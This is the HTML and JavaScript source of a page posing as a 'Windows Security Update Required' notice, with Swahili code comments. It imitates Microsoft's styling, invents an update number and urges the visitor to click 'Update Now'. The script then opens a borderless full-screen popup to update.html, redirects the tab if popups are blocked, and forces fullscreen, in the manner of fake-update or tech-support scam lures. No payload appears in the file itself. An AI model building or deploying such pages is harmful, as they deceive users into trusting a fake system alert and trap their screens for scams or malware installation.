 <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Windows Security Update</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #003f6b;
    font-family: 'Segoe UI', sans-serif;
    height: 100vh;
    width: 100vw;
    overflow: hidden;
    color: white;
    display: flex;
    justify-content: center;
    align-items: center;
    user-select: none;
    -webkit-user-select: none;
  }

  .landing {
    text-align: center;
    max-width: 500px;
    padding: 40px;
  }

  .landing .icon { font-size: 64px; margin-bottom: 20px; }
  .landing h1 { font-size: 28px; font-weight: 300; margin-bottom: 15px; letter-spacing: 0.5px; }
  .landing p { font-size: 15px; color: rgba(255,255,255,0.7); margin-bottom: 30px; line-height: 1.6; }

  .btn {
    background: #0078d4;
    color: white;
    border: none;
    padding: 15px 50px;
    font-size: 18px;
    border-radius: 6px;
    cursor: pointer;
    transition: background 0.3s, transform 0.1s;
    font-family: 'Segoe UI', sans-serif;
    font-weight: 500;
  }
  .btn:hover { background: #005a9e; }
  .btn:active { transform: scale(0.97); }
  .btn:disabled { background: #444; cursor: not-allowed; transform: none; }

  .landing small { display: block; margin-top: 25px; font-size: 11px; color: rgba(255,255,255,0.25); }
</style>
</head>
<body>

<div class="landing">
  <div class="icon">🔧</div>
  <h1>Windows Security Update Required</h1>
  <p>
    Critical security patches are available for your device.<br>
    These patches fix vulnerabilities currently being exploited.<br><br>
    <strong>Click "Update Now" to install.</strong>
  </p>
  <button class="btn" id="startBtn">⚠️ Update Now</button>
  <small>Windows 11 Security • KB5050520</small>
</div>

<script>
document.getElementById('startBtn').addEventListener('click', function() {
  var btn = this;
  btn.textContent = '✓ Installing...';
  btn.disabled = true;

  // Fungua update page kwa ukubwa wa skrini nzima
  var w = window.screen.width;
  var h = window.screen.height;

  var popup = window.open(
    'update.html',
    'WindowsUpdate',
    'width=' + w + ',height=' + h + ',top=0,left=0,toolbar=no,location=no,status=no,menubar=no,scrollbars=no,resizable=no'
  );

  if (!popup) {
    // Popup imezuiwa → fungua update.html kwenye tab hii
    window.location.href = 'update.html';
    return;
  }

  // Jaribu fullscreen kwenye popup
  setTimeout(function() {
    try {
      var el = popup.document.documentElement;
      if (el.requestFullscreen) el.requestFullscreen({ navigationUI: 'hide' }).catch(() => {});
      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
    } catch(e) {}
  }, 500);

  // Fungua fullscreen kwenye landing page pia
  setTimeout(function() {
    var el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen({ navigationUI: 'hide' }).catch(() => {});
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
  }, 100);
});
</script>
</body>
</html>
